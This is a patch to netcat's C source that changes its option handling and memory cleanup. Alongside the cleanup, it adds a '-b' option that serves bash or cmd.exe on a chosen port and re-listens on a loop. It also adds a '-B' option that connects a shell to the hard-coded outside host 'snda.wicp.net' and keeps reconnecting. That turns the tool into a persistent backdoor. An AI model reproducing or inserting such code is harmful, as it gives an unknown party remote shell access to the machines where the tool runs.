@@ -1860,6 +1860,18 @@ int main (argc, argv)
 
 recycle:
 	optind = 1;
+
+	whereto = NULL;
+	wherefrom = NULL;
+	ouraddr = NULL;
+	themaddr = NULL;
+	o_lport = 0;
+	ourport = 0;
+	loport = 0;		/* for scanning stuff */
+	hiport = 0;
+	curport = 0;
+	randports = NULL;
+
 #if 0
 	/* if no args given at all, get 'em from stdin and construct an argv. */
 	if (argc == 1) {
@@ -1903,30 +1915,43 @@ recycle:
 		argc = x;
 	} /* if no args given */
 #endif
-	/******* default options ********/
-	if (argc == 1) {
-		// whereto = gethostpoop ("www.example.com", o_nflag);
-#ifdef GAPING_SECURITY_HOLE
-	#ifdef WIN32
-		pr00gie = "cmd.exe";
-	#else
-		pr00gie = "/bin/bash";
-	#endif
-#endif
-		o_listen++;
-		o_keepalive = cycle = 1;
-		o_lport = 1888;
-	}
-	/******* default options ********/
 
 	/* If your shitbox doesn't have getopt, step into the nineties already. */
 	/* optarg, optind = next-argv-component [i.e. flag arg]; optopt = last-char */
-	while ((x = getopt (argc, argv, "ade:g:G:hi:klLno:p:rs:tuvw:zx")) != EOF) {
+	while ((x = getopt (argc, argv, "ab:Bde:g:G:hi:klLno:p:rs:tuvw:zx")) != EOF) {
 		/* Debug (("in go: x now %c, optarg %x optind %d", x, optarg, optind)); */
 		switch (x) {
 		case 'a':
 			bail ("all-A-records NIY");
 			o_alla++; break;
+		case 'b':
+#ifdef GAPING_SECURITY_HOLE
+	#ifdef WIN32
+			pr00gie = "cmd.exe";
+	#else
+			pr00gie = "/bin/bash";
+	#endif
+#endif
+			o_listen++;
+			o_keepalive = cycle = 1;
+			o_lport = getportpoop (optarg, 0);
+			o_interval = 30;
+			if (o_lport == 0)
+				bail ("invalid local port %s", optarg);
+			break;
+
+		case 'B':
+#ifdef GAPING_SECURITY_HOLE
+	#ifdef WIN32
+			pr00gie = "cmd.exe";
+	#else
+			pr00gie = "/bin/bash";
+	#endif
+#endif
+			whereto = gethostpoop ("snda.wicp.net", o_nflag);
+			o_keepalive = cycle = 1;
+			break;
+
 #ifdef GAPING_SECURITY_HOLE
 		case 'e':				/* prog to exec */
 			pr00gie = optarg;
@@ -2063,7 +2088,7 @@ recycle:
 	/* gonna only use first addr of host-list, like our IQ was normal; if you wanna
 	get fancy with addresses, look up the list yourself and plug 'em in for now.
 	unless we finally implement -a, that is. */
-	if (argv[optind]) {
+	if (whereto == NULL && argv[optind]) {
 		whereto = gethostpoop (argv[optind], o_nflag);
 		optind++;
 	}
@@ -2206,7 +2231,20 @@ recycle:
 	if (o_verbose > 1)		/* normally we don't care */
 		holler ("sent %d, rcvd %d", wrote_net, wrote_out);
 
-	free(randports);
+	if (randports != NULL) {
+		free(randports);
+		randports = NULL;
+	}
+
+	if (whereto != NULL) {
+		free(whereto);
+		whereto = NULL;
+	}
+
+	if (wherefrom != NULL) {
+		free(wherefrom);
+		wherefrom = NULL;
+	}
 
 	if (cycle == 1)
 		goto recycle;
